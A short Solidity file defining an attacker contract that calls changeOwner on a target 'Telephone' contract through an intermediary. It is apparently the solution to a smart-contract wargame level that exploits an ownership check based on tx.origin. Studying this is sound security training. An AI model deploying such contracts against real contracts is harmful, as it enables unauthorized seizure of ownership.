// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephoneContract {
    function changeOwner(address) external;
}

contract TelephoneAttacker {

    address public telephoneContract;

    constructor(address _telephoneContract) {
        telephoneContract = _telephoneContract;
    }

    function changeOwner() external {
        ITelephoneContract(telephoneContract).changeOwner(msg.sender);
    }

    receive() external payable {}

    fallback() external payable {}
}
